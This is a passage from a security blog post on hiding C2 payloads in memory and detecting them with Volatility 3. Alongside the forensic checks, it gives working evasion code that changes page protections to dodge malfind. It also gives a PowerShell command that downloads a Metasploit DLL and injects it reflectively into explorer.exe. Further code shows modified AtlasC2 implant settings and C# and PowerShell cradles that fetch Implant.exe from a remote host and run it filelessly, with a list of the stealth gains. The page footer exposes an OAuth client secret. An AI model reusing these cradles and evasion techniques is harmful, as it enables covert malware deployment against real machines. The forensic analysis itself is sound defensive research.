<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">write_exec = <span class="string">&quot;EXECUTE&quot;</span> <span class="keyword">in</span> protection_string <span class="keyword">and</span> <span class="string">&quot;WRITE&quot;</span> <span class="keyword">in</span> protection_string</span><br><span class="line"></span><br><span class="line"><span class="comment"># the write/exec check applies to everything</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> write_exec:</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>Obviously, if we change the protection to <code>PAGE_EXECUTE_READ</code> after writing, we can bypass this detection. Just add this after <code>copy</code></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IntPtr addr = VirtualAlloc(IntPtr.Zero, (<span class="built_in">uint</span>)res.Length, <span class="number">0x3000</span>, <span class="number">0x04</span>);</span><br><span class="line">Marshal.Copy(res, <span class="number">0</span>, addr, res.Length);</span><br><span class="line"><span class="built_in">uint</span> old;</span><br><span class="line">VirtualProtect(addr, (<span class="built_in">uint</span>)res.Length, <span class="number">0x20</span>, <span class="keyword">out</span> old);</span><br><span class="line">IntPtr hThread = CreateThread(IntPtr.Zero, <span class="number">0</span>, addr, IntPtr.Zero, <span class="number">0</span>, IntPtr.Zero);</span><br></pre></td></tr></table></figure>

<p>However, while using <code>malfind</code>, it still can locate injected code and marked as <code>PAGE_EXECUTE_READWRITE</code>. Why? I think that’s caused by the <strong>Virtual</strong>Protect, it just modified the permission of virtual memory page, but the volatility could check the actual physical memory page. (I haven’t confirmed this suppose). </p>
<h2 id="Memory-Forensics-with-Reflectively-Injected-Assembly"><a href="#Memory-Forensics-with-Reflectively-Injected-Assembly" class="headerlink" title="Memory Forensics with Reflectively Injected Assembly"></a>Memory Forensics with Reflectively Injected Assembly</h2><p>As we can see, <code>Malfind</code> could locate the injected code because these code locate at writable and executable memory page. If we load an unmanaged  assembly reflectively and hide it out of our cradle process, it will be much harder to find it.</p>
<h3 id="Use-Invoke-ReflectivePEInjection-ps1-to-inject-assembly"><a href="#Use-Invoke-ReflectivePEInjection-ps1-to-inject-assembly" class="headerlink" title="Use Invoke-ReflectivePEInjection.ps1 to inject assembly"></a>Use <code>Invoke-ReflectivePEInjection.ps1</code> to inject assembly</h3><p>In this section we will use <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectoivePEInjection.ps1</a> to inject an assembly into an existed process reflectively, but because of the multiple instances of <code>GetProcAddress</code> in <code>UnsafeNativeMethods</code>, we have to modify it so that it could works in latest Windows 10. The modified one I used is here: <a target="_blank" rel="noopener" href="https://github.com/4xpl0r3r/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://github.com/4xpl0r3r/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> <span class="string">&quot;http://192.168.209.1:5555/Invoke-ReflectivePEInjection.ps1&quot;</span> <span class="literal">-o</span> <span class="built_in">Invoke-ReflectivePEInjection</span>.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> <span class="string">&quot;C:\Users\Admin\Desktop\Invoke-ReflectivePEInjection.ps1&quot;</span></span><br><span class="line"><span class="variable">$procid</span> = (<span class="built_in">Get-Process</span> <span class="literal">-Name</span> explorer).Id</span><br><span class="line"><span class="variable">$bytes</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">&#x27;http://192.168.209.1:5555/met.dll&#x27;</span>)</span><br><span class="line"><span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEBytes</span> <span class="variable">$bytes</span> <span class="literal">-ProcId</span> <span class="variable">$procid</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$procid</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>I tried Havoc demon with <code>dll</code> format here, but it caused explorer.exe crashed, so I used Metasploit payload here and it works well</p>
</blockquote>
<p><img src="image-20230313131654181.png" alt="image-20230313131654181"></p>
<blockquote>
<p>The exception <code>VoidFunc not found</code> doesn’t affect our payload’s functionality, because our payload executed during loading.</p>
</blockquote>
<p>Check the pid, we found the pid of <code>meterpreter</code> is different from the pid of the <code>explorer</code></p>
<p><img src="image-20230313132251260.png" alt="image-20230313132251260"></p>
<h3 id="Forensics-with-Volatility-3-1"><a href="#Forensics-with-Volatility-3-1" class="headerlink" title="Forensics with Volatility 3"></a>Forensics with Volatility 3</h3><h4 id="Check-Process-Tree-1"><a href="#Check-Process-Tree-1" class="headerlink" title="Check Process Tree"></a>Check Process Tree</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ~/Tool\ Set.localized/Forensics/volatility3/vol.py -f memdump1.raw windows.pstree</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6072    5992    explorer.exe    0xdd83351cb340  53      -       2       False   2023-03-13 05:11:55.000000      N/A</span><br><span class="line">* 3952  6072    rundll32.exe    0xdd8332854080  1       -       2       False   2023-03-13 05:16:26.000000      N/A</span><br></pre></td></tr></table></figure>

<p>Because our payload is in the <code>DllEntryPoint</code> Function, so it actually runs in <code>rundll32.exe</code> process, which is very suspicious and we can easily dump it from this <code>rundll32.exe</code> process.</p>
<h3 id="Hide-deeper-by-fully-leveraging-Invoke-ReflectivePEInjection-ps1"><a href="#Hide-deeper-by-fully-leveraging-Invoke-ReflectivePEInjection-ps1" class="headerlink" title="Hide deeper by fully leveraging Invoke-ReflectivePEInjection.ps1"></a>Hide deeper by fully leveraging <code>Invoke-ReflectivePEInjection.ps1</code></h3><p>By reviewing <code>Invoke-ReflectivePEInjection.ps1</code>, the exception we meet is shown as below and we can found that we can create a function called <code>VoidFunc</code> and it will be ran as a new thread in the remote process. Cause it will be a new thread, not a process, it could be more unsuspicious, but we have to modify the generating code to make it store the malicious payload in <code>VoidFunc</code> part, rather than <code>DllEntryPoint</code> Part.</p>
<p><img src="image-20230313133408825.png" alt="image-20230313133408825"></p>
<h2 id="Memory-Forensics-with-Net-Framework-Dynamically-Loaded-Managed-Assembly"><a href="#Memory-Forensics-with-Net-Framework-Dynamically-Loaded-Managed-Assembly" class="headerlink" title="Memory Forensics with .Net Framework Dynamically Loaded Managed Assembly"></a>Memory Forensics with .Net Framework Dynamically Loaded Managed Assembly</h2><p>Recently, I analyzed a cradle developed by the <code>Mallox</code> ransomware organization. The cradle is developed with C# and it uses  <code>AppDomain.Load</code> to load an assembly into managed memory, which is very stealthy.</p>
<h3 id="Prepare-AtlasC2"><a href="#Prepare-AtlasC2" class="headerlink" title="Prepare AtlasC2"></a>Prepare AtlasC2</h3><p>Here I used <strong><a target="_blank" rel="noopener" href="https://github.com/Gr1mmie/AtlasC2">AtlasC2</a></strong> to generate Implant. To make it work, I modified several code section for <code>Implant</code> as below</p>
<p><code>Program.cs</code> function <code>Main</code></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Thread.Sleep(10000);</span></span><br><span class="line"></span><br><span class="line">    Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.Idle;</span><br><span class="line"></span><br><span class="line">    GenImplantData();</span><br><span class="line">    ImplantCommandsInit();</span><br><span class="line"></span><br><span class="line">    _comms = <span class="keyword">new</span> HTTPComms(<span class="string">&quot;192.168.209.1&quot;</span>, <span class="number">8089</span>); <span class="comment">// your listener</span></span><br><span class="line">    _comms.ImplantInit(_implantData);</span><br><span class="line">    _comms.Start();</span><br><span class="line"></span><br><span class="line">    _cancelToken = <span class="keyword">new</span> CancellationTokenSource();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!_cancelToken.IsCancellationRequested) &#123;</span><br><span class="line">        Thread.Sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (_comms.DataRecv(<span class="keyword">out</span> <span class="keyword">var</span> tasks)) &#123; HandleTasks(tasks); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Utils/ImplantDataUtils.cs</code> function<code>GetHostIP</code></p>
<blockquote>
<p>The original code may cause exception and end the program when the Internet is not accessible.</p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">GetHostIP</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> (Socket socket = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Dgram, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            socket.Connect(<span class="string">&quot;8.8.8.8&quot;</span>, <span class="number">65530</span>);</span><br><span class="line">            IPEndPoint endPoint = socket.LocalEndPoint <span class="keyword">as</span> IPEndPoint;</span><br><span class="line">            <span class="keyword">return</span> (endPoint.Address.ToString());</span><br><span class="line">        &#125;</span><br><span class="line">        catch(System.Net.Sockets.SocketException e)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;Internal Network&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After compiling, we got the Implant ready, the Team server running and listening.</p>
<h3 id="Custom-Managed-Cradle"><a href="#Custom-Managed-Cradle" class="headerlink" title="Custom Managed Cradle"></a>Custom Managed Cradle</h3><blockquote>
<p>I recommend you to compile the cradle with the same target .net framework with <code>Implant</code></p>
</blockquote>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> WebClient();</span><br><span class="line">    <span class="keyword">var</span> assemblyData = client.DownloadData(<span class="string">&quot;http://192.168.209.1:5555/Implant.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> ass = AppDomain.CurrentDomain.Load(assemblyData);</span><br><span class="line">    Type entryType = ass.GetType(<span class="string">&quot;Implant.Program&quot;</span>);</span><br><span class="line">    MethodInfo method = entryType.GetMethod(<span class="string">&quot;Main&quot;</span>, System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);</span><br><span class="line">    <span class="keyword">var</span> args= <span class="keyword">new</span> <span class="built_in">object</span>[] &#123; <span class="keyword">new</span> <span class="built_in">string</span>[] &#123; &#125; &#125;;</span><br><span class="line">    method.Invoke(<span class="literal">null</span>, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Forensics-with-Volatility-3-2"><a href="#Forensics-with-Volatility-3-2" class="headerlink" title="Forensics with Volatility 3"></a>Forensics with Volatility 3</h3><h3 id="Check-Process-Tree-2"><a href="#Check-Process-Tree-2" class="headerlink" title="Check Process Tree"></a>Check Process Tree</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python volatility3/vol.py -f memdump2.raw windows.malfind.Malfind --pid 5572</span><br></pre></td></tr></table></figure>

<p><img src="image-20230313151555724.png" alt="image-20230313151555724"></p>
<p>As we can see, there isn’t any sub process for <code>ManagedCradle.exe</code></p>
<h3 id="Check-Malfind"><a href="#Check-Malfind" class="headerlink" title="Check Malfind"></a>Check <code>Malfind</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python volatility3/vol.py -f memdump2.raw  windows.pstree</span><br></pre></td></tr></table></figure>

<p><img src="image-20230313151745065.png" alt="image-20230313151745065"></p>
<p>Found 2 pieces suspicious, let’s try to remove our cradle code and run again.</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> WebClient();</span><br><span class="line"><span class="keyword">var</span> assemblyData = client.DownloadData(<span class="string">&quot;http://192.168.209.1:5555/Implant.exe&quot;</span>);</span><br><span class="line">Thread.Sleep(<span class="number">10000</span>);</span><br></pre></td></tr></table></figure>

<p><img src="image-20230313152425113.png" alt="image-20230313152425113"></p>
<p>It’s similar, so we can treat it as normal.</p>
<h3 id="Check-Dll-List"><a href="#Check-Dll-List" class="headerlink" title="Check Dll List"></a>Check Dll List</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python volatility3/vol.py -f memdump2.raw  windows.dlllist.DllList --pid 5572</span><br></pre></td></tr></table></figure>

<p>Generated a large list, it’s hard to confirm whether a dll is suspicious. Maybe analyze them one by one can help us found the malicious one, but it’s too hard.</p>
<p><img src="image-20230313153029636.png" alt="image-20230313153029636"></p>
<h3 id="What-is-the-best-way-to-locate-the-threats-hidden-in-managed-memory"><a href="#What-is-the-best-way-to-locate-the-threats-hidden-in-managed-memory" class="headerlink" title="What is the best way to locate the threats hidden in managed memory?"></a>What is the best way to locate the threats hidden in managed memory?</h3><p>C# and .Net Framework is similar to Java, so the best way to track loaded assembly is using the interfaces that offered by .Net Framework itself, like I analyzed in <a target="_blank" rel="noopener" href="https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/">https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/</a></p>
<h2 id="Load-Managed-Assembly-in-PowerShell"><a href="#Load-Managed-Assembly-in-PowerShell" class="headerlink" title="Load Managed Assembly in PowerShell"></a>Load Managed Assembly in PowerShell</h2><p>According to the analyzing above, we know that loading the malicious assembly into managed memory is a good way to hide. In this section, I will use PowerShell to replace the C# cradle so that there will be no file in the disk.</p>
<h3 id="My-PowerShell-Cradle"><a href="#My-PowerShell-Cradle" class="headerlink" title="My PowerShell Cradle"></a>My PowerShell Cradle</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$assemblyData</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">&#x27;http://192.168.209.1:5555/Implant.exe&#x27;</span>)</span><br><span class="line"><span class="variable">$ass</span> = [<span class="type">AppDomain</span>]::CurrentDomain.Load(<span class="variable">$assemblyData</span>);</span><br><span class="line"><span class="variable">$entryType</span> = <span class="variable">$ass</span>.GetType(<span class="string">&quot;Implant.Program&quot;</span>);</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$entryType</span>.GetMethod(<span class="string">&quot;Main&quot;</span>,[<span class="type">System.Reflection.BindingFlags</span>]::<span class="keyword">Static</span> <span class="operator">-bor</span> [<span class="type">System.Reflection.BindingFlags</span>]::NonPublic);</span><br><span class="line"><span class="variable">$args</span> = <span class="selector-tag">@</span>(,[<span class="type">System.String</span>[]]<span class="selector-tag">@</span>())</span><br><span class="line"><span class="variable">$method</span>.Invoke(<span class="variable">$null</span>,<span class="variable">$args</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Pros-and-Cons"><a href="#Pros-and-Cons" class="headerlink" title="Pros and Cons"></a>Pros and Cons</h3><p>Running this, our malicious implant can hide in the <code>AppDomain</code> of current PowerShell process, having several pros listed below</p>
<ul>
<li>No suspicious memory section</li>
<li>No suspicious native DLL</li>
<li>No file in disk</li>
</ul>
<p>Also, cons listed below:</p>
<ul>
<li>May be influenced by AMSI</li>
<li>PowerShell command history could be reviewed in Windows Event Log</li>
</ul>
</div><div class="article-licensing box"><div class="licensing-title"><p>C2 Payload Hiding and Memory Forensics</p><p><a href="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/">https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>4xpl0r3r</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2023-03-13</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2023-03-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Red-Teaming/">Red Teaming</a><a class="link-muted mr-2" rel="tag" href="/tags/Blue-Teaming/">Blue Teaming</a><a class="link-muted mr-2" rel="tag" href="/tags/Memory-Forensics/">Memory Forensics</a><a class="link-muted mr-2" rel="tag" href="/tags/C2/">C2</a><a class="link-muted mr-2" rel="tag" href="/tags/PowerShell/">PowerShell</a><a class="link-muted mr-2" rel="tag" href="/tags/C/">C#</a><a class="link-muted mr-2" rel="tag" href="/tags/Antivirus-Evasion/">Antivirus Evasion</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/Experience/Using-CodeQL-to-find-out-Log4j-CVE-2021-44228/"><span class="level-item">Using CodeQL to find out Log4j CVE-2021-44228</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "4f6567ba6081fc148196dd0c838a9f9d",
            repo: "Blog-Comments",
            owner: "4xpl0r3r",
            clientID: "9497fa90b0fed6513d24",
            clientSecret: "355dce85acb10c44d73d459e0087635c3d1404cb",
            admin: ["4xpl0r3r"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar1.png" alt="4xpl0r3r"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">4xpl0r3r</p><p class="is-size-6 is-block">OSCE3 | OSCP | CTFer</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Orange Cyberdefense, Shanghai</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">19</p></a></div></div></nav><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/4xpl0r3r"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:4xpl0r3r@gmail.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="https://api.follow.it/subscription-form/bGV4KzhoNzZNdk0rZ1Q0VDhvWlNucE5UYzFwZzVZZFJBaTdLRWxDRXVlenU2Q0k0SzFVUTA3OWtSSnNNa2NNaHdVNUtyVXFNVXBtUWpTT3VSVlE0ZysrWEdxMTFFQVFnV2tZUksrd0d3a1crVFgyaTBVbUhTRUplZVV3YnVNaDh8VjAxd1dmVEdzVzgvSTZMV3dXK1FHbGhFL2ZTdGl3b0FKeWk0YnZmQ2MyND0=/8" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Prerequisite"><span class="level-left"><span class="level-item">Prerequisite</span></span></a></li><li><a class="level is-mobile" href="#Memory-Forensics-with-Shellcode-Cradle"><span class="level-left"><span class="level-item">Memory Forensics with Shellcode Cradle</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#My-Custom-Cradle"><span class="level-left"><span class="level-item">My Custom Cradle</span></span></a></li><li><a class="level is-mobile" href="#Forensics-with-Volatility-3"><span class="level-left"><span class="level-item">Forensics with Volatility 3</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Validate-Image"><span class="level-left"><span class="level-item">Validate Image</span></span></a></li><li><a class="level is-mobile" href="#Check-Process-Tree"><span class="level-left"><span class="level-item">Check Process Tree</span></span></a></li><li><a class="level is-mobile" href="#Locate-Injected-Code"><span class="level-left"><span class="level-item">Locate  Injected Code</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#Memory-Forensics-with-Reflectively-Injected-Assembly"><span class="level-left"><span class="level-item">Memory Forensics with Reflectively Injected Assembly</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Use-Invoke-ReflectivePEInjection-ps1-to-inject-assembly"><span class="level-left"><span class="level-item">Use Invoke-ReflectivePEInjection.ps1 to inject assembly</span></span></a></li><li><a class="level is-mobile" href="#Forensics-with-Volatility-3-1"><span class="level-left"><span class="level-item">Forensics with Volatility 3</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Check-Process-Tree-1"><span class="level-left"><span class="level-item">Check Process Tree</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Hide-deeper-by-fully-leveraging-Invoke-ReflectivePEInjection-ps1"><span class="level-left"><span class="level-item">Hide deeper by fully leveraging Invoke-ReflectivePEInjection.ps1</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Memory-Forensics-with-Net-Framework-Dynamically-Loaded-Managed-Assembly"><span class="level-left"><span class="level-item">Memory Forensics with .Net Framework Dynamically Loaded Managed Assembly</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Prepare-AtlasC2"><span class="level-left"><span class="level-item">Prepare AtlasC2</span></span></a></li><li><a class="level is-mobile" href="#Custom-Managed-Cradle"><span class="level-left"><span class="level-item">Custom Managed Cradle</span></span></a></li><li><a class="level is-mobile" href="#Forensics-with-Volatility-3-2"><span class="level-left"><span class="level-item">Forensics with Volatility 3</span></span></a></li><li><a class="level is-mobile" href="#Check-Process-Tree-2"><span class="level-left"><span class="level-item">Check Process Tree</span></span></a></li><li><a class="level is-mobile" href="#Check-Malfind"><span class="level-left"><span class="level-item">Check Malfind</span></span></a></li><li><a class="level is-mobile" href="#Check-Dll-List"><span class="level-left"><span class="level-item">Check Dll List</span></span></a></li><li><a class="level is-mobile" href="#What-is-the-best-way-to-locate-the-threats-hidden-in-managed-memory"><span class="level-left"><span class="level-item">What is the best way to locate the threats hidden in managed memory?</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Load-Managed-Assembly-in-PowerShell"><span class="level-left"><span class="level-item">Load Managed Assembly in PowerShell</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#My-PowerShell-Cradle"><span class="level-left"><span class="level-item">My PowerShell Cradle</span></span></a></li><li><a class="level is-mobile" href="#Pros-and-Cons"><span class="level-left"><span class="level-item">Pros and Cons</span></span></a></li></ul></li></ul></div></div><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://cn.4xpl0r3r.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Switch Language - 简体中文</span></span><span class="level-right"><span class="level-item tag">cn.4xpl0r3r.com</span></span></a></li><li><a class="level is-mobile" href="https://github.com/4xpl0r3r" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">GitHub</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Certifications/"><span class="level-start"><span class="level-item">Certifications</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Docs/"><span class="level-start"><span class="level-item">Docs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Experience/"><span class="level-start"><span class="level-item">Experience</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Red-Blue/"><span class="level-start"><span class="level-item">Red&amp;Blue</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Vuln-Analysis/"><span class="level-start"><span class="level-item">Vuln-Analysis</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-13T08:45:43.000Z">2023-03-13</time></p><p class="title"><a href="/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/">C2 Payload Hiding and Memory Forensics</a></p><p class="categories"><a href="/categories/Red-Blue/">Red&amp;Blue</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-02-14T06:24:24.000Z">2023-02-14</time></p><p class="title"><a href="/Experience/Using-CodeQL-to-find-out-Log4j-CVE-2021-44228/">Using CodeQL to find out Log4j CVE-2021-44228</a></p><p class="categories"><a href="/categories/Experience/">Experience</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-30T03:46:14.000Z">2022-01-30</time></p><p class="title"><a href="/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/">Vulnerability-Analysis - CVE-2021-4034 Linux Polkit Privilege Escalation</a></p><p class="categories"><a href="/categories/Vuln-Analysis/">Vuln-Analysis</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-27T14:39:50.000Z">2022-01-27</time></p><p class="title"><a href="/Certifications/OSCE3-Review-OSCP-OSEP-OSWE-OSED/">OSCE3 Review (OSCP+OSEP+OSWE+OSED)</a></p><p class="categories"><a href="/categories/Certifications/">Certifications</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-01-19T13:06:00.000Z">2022-01-19</time></p><p class="title"><a href="/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/">Vulnerability Analysis - CVE-2021-44228 Log4Shell</a></p><p class="categories"><a 